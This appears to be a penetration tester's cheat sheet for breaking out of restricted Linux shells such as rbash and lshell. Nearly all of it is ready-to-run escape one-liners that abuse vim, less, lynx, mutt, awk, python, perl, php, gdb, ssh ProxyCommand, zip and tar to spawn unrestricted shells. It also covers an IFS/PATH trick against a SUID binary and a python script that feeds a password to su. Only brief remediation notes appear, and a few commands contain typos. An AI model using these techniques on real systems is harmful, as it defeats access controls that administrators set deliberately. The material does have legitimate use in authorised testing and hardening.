Limited Shell Escapes


Common restricted shells:
rbash
rksh
rzsh
lshell
busybox


ENUMERATION:
echo $SHELL
check for available commands (cd/ls/echo)
check absolute paths of missing commands
check for operators, espescially pipes (>,>>,<,|)
check for available scripting language interpreters (perl,ruby,python)
sudo -l
env/printenv


General techniques:
Absolute Paths
	/bin/sh -i
	cp /bin/sh ./sh
	/bin/busybox sh

Console Editors
	--e.g. ed, ne, nano, pico, vim, nmap --interactive
	:!/binls -l .b*
		--enumeration
	:set shell=/bin/sh
	:shell
		--set env variables to escape restricted shell
	:!/bin/bash
		--execute new shell instance to escape restricted shell (vi/vim/nmap -i)
	!'/bin/sh'
		--execute new shell instance to escape restricted shell (ed)
	!/bin/sh
		--execute new shell instance to escape restricted shell (man,ftp,gdb)
	ne
		>prefs >Load Prefs
		--arbitrary file load/directory traversal (ne)
	pico -s "/bin/bash"
		>/bin/bash >CTRL+T
	emacs
		alt+!
	REMEDIATION:
		find / -type f -perm -4000
Restricted Console Editors
	:python import os; os.system("/bin/bash")
		(rvim)
Pager Commands
	more ~/.bashrc
	OR
	less .bashrc
		!'sh'
		--target file must be long enough to paginate
	man ls
	pinfo ls
	REMEDIATION
		find / -type f -perm -4000

Console Browsers
	--e.g. lynx, links, elinks
	links
		>File >OS shell
	lynx
		>o >Editor>=/usr/bin/vim >"Accept Changes" >e
	lynx --editor=/usr/bin/vim www.google.com
	export EDITOR=/usr/bin/vim && elinks google.com
		>ENTER >F4
	REMEDIATION:
		find / -type f -perm -4000

Email Clients
	mutt
		>! >/bin/sh
	find -name .* -exec awk 'BEING {system("cd /root; ls"}' \;
	REMEDIATION
		find / -type f -perm -4000

Programming Languages
	awk 'BEGIN {system("/bin/sh")}'
	expect
		>spawn sh
	python -c 'import os; os.system("/bin/bash");'
	python -c '__import__("os").system("id")'
	irb/ruby
		>exec '/bin/sh'
	perl -e 'system("/bin/bash");'
	perl -e 'exec("sh -i");'
	php -a
		>system("/bin/sh");
	php -r 'exec("sh -i");'
	lua
		>os.execute('/bin/sh').

File Transfer
	ftp
		!/bin/sh
	scp -S /path/to/execute x y:

Debuggers
	gdb
		!/bin/sh

SSH
	ssh username@localhost -t "/bin/sh"
	ssh username@127.0.0.1 -t "bash --noprofile"
	ssh -o ProxyCommand="sh -c /tmp/getshell.sh"
		--SUID

Version Control
	git help status
		>!/bin/bash

Compression
	zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
	tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash

Increase job priority
	nice /bin/bash

CWD in PATH
	PATH=.:${PATH} && export PATH

Change Shells
	bash -i
	chsh /bin/bash
	>echo '#!/bin/sh' >alcatraz.sh
	>echo '/bin/bash -i' >>alcatraz.sh
	>./alcatraz.sh

IFS Exploit
	IFS (Internal Field Separator) is used to separate substrings/args
		e.g. IFS set to ' ' ls -lash; IFS set to ';' ls;-ashl
	-where suid program execute at login via symlink
	cat /home/usr/bin
		#!/bin/bash
		/bin/sh
	find /usr/local/ -user root -type f -perm 4000 -exec ls -ashl \;
		---s--x--x 1 root root 12412 Dec 12 11:11 hello
	PATH=/home/usr/:${PATH}
	export PATH
	IFS=/
	export IFS
	/usr/local/hello
	REMEDIATION:
		In /etc/fstab
			>/dev/hda6 /tmp ext3 nosuid,noexec 0 0
		--home/usr /should be its own partiation
	
LD_PRELOAD


SYMLINKS


SSH Lock Escape Sequences
	--escapes are only recognized immediately after newline
  ~.  - terminate session
  ~B  - send a BREAK to the remote system
  ~R  - Request rekey (SSH protocol 2 only)
  ~#  - list forwarded connections
  ~?  - this message
  ~~  - send the escape character by typing it twice


Specific Techniques
	rbash Jail Escape: RequestTTY no
ssh -o RequestTTY=no user@ip

	Bash --noprofile
ssh monitor@127.0.0.1 -t "bash --noprofile" 




Interactive TTY Shells
/usr/bin/expect sh
python -c ‘import pty; pty.spawn(“/bin/sh”)’
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
	--execute one command with su as another user if you do not have access to the shell



GTFOBINS
https://gtfobins.github.io/